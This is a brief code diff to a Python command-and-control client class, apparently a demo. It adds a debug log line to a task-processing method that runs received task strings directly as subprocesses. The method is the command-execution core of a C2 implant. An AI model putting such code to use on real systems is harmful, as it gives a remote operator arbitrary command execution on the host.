@@ -163,6 +163,7 @@ class C2Client:
 
     def process_tasking(self, task: str) -> str:
         # yep this is super wonky and prone to huge vulnerabilities and errors.  just a demo
+        logger.debug(f"Running {task}")
         results = subprocess.run(task)
         return results
 
